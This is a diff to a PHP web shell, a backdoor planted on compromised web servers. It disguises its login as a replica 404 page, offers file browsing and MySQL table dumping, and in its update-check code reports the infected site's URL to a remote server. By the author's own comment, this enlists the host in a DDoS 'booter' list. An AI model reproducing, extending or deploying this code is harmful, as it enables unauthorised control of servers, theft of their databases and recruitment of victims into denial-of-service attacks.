@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.97;
+$version            = 2.971;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -69,15 +69,13 @@ if ($action == 'checkupdates') {
     	if ($helpsupportbooter == false){
     	    $cuuff = $cforupurl;
     	}else{
-    	    $add = array("u"=>urlencode("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']));
+    	    $add = array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']));
     	    $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
-    	    //$cuuff = $cforupurl . "?u=" . urlencode("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
     	}
     } else {
         $add = array("v"=>$version);
-        if($helpsupportbooter != false) $add = array_merge($add, array("u"=>urlencode("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])));
+        if($helpsupportbooter != false) $add = array_merge($add, array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])));
         $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
-        //$cuuff = $cforupurl . "?v=" . $version;
     }
     $res = file_get_contents($cuuff);
     if (!$res) {
@@ -215,8 +213,8 @@ if ($pass) {
     }
 }
 $errmsg = '';
-$uchar = '&#9650;';
-$dchar = '&#9660;';
+$uchar = '▲';
+$dchar = '▼';
 !$action && $action = 'file';
 if ($doing == 'downfile' && $thefile) {
     if (!@file_exists($thefile)) {
@@ -539,9 +537,6 @@ function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writa
 </head>
 <body style="margin:0;table-layout:fixed; word-break:break-all">
 ';
-if ($helpsupportbooter != false){
-$version .= "&u=" . urlencode("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
-}
 formhead(array(
     'name' => 'opform'
 ));
@@ -666,7 +661,7 @@ if ($action == 'dismissupdate'){
         $baseurl = rtrim(str_replace($query, "", $cforupurl), "?");
         parse_str($query, $vars);
         $add = array("v"=>$version);
-        if($helpsupportbooter != false) $add = array_merge($add, array("u"=>urlencode("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])));
+        if($helpsupportbooter != false) $add = array_merge($add, array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])));
         $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
     	$res          = file_get_contents($cuuff);
     	if (!$res) {
@@ -1886,10 +1881,10 @@ function mysqlfile(doing){
 						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
 						p('<td align="center" width="2%"><input type="checkbox" name="bak_table[]" value="'.$table['Name'].'" /></td>');
 						p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
-						p('<td>'.$table['Rows'].'&nbsp;</td>');
+						p('<td>'.$table['Rows'].' </td>');
 						p('<td>'.sizecount($table['Data_length']).'</td>');
-						p('<td>'.$table['Create_time'].'&nbsp;</td>');
-						p('<td>'.$table['Update_time'].'&nbsp;</td>');
+						p('<td>'.$table['Create_time'].' </td>');
+						p('<td>'.$table['Update_time'].' </td>');
 						if ($highver) {
 							p('<td>'.$table['Engine'].'</td>');
 							p('<td>'.$table['Collation'].'</td>');
@@ -1898,17 +1893,17 @@ function mysqlfile(doing){
 						p('</tr>');
 					}
 					p('<tr class="head">');
-					p('<td width="2%">&nbsp;</td>');
+					p('<td width="2%"> </td>');
 					p('<td>'.$table_num.' table(s)</td>');
 					p('<td>'.$table_rows.'</td>');
 					p('<td>'.$data_size.'</td>');
-					p('<td>&nbsp;</td>');
-					p('<td>&nbsp;</td>');
+					p('<td> </td>');
+					p('<td> </td>');
 					if ($highver) {
 						p('<td>'.$db_engine['Value'].'</td>');
 						p('<td>'.$db_collation['Value'].'</td>');
 					}
-					p('<td>&nbsp;</td>');
+					p('<td> </td>');
 					p('</tr>');
 					p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"bak_path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"button\" value=\"Export selection table\" onclick=\"$('doing').value='dump';window.onbeforeunload = null;$('dbform').submit();\" /></td></tr>");
 					p("</table>");
@@ -2271,15 +2266,13 @@ function insertAfter(referenceNode, newNode) {
     	    if ($helpsupportbooter == false){
     	        $cuuff = $cforupurl;
     	    }else{
-    	        $add = array("u"=>urlencode("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']));
+    	        $add = array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']));
     	        $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
-    	        //$cuuff = $cforupurl . "?u=" . urlencode("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
-    	    }
+    	        }
         } else {
             $add = array("v"=>$version);
-            if($helpsupportbooter != false) $add = array_merge($add, array("u"=>urlencode("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])));
+            if($helpsupportbooter != false) $add = array_merge($add, array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])));
             $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
-            //$cuuff = $cforupurl . "?v=" . $version;
         }
         $res = file_get_contents($cuuff);
         if (!$res) {
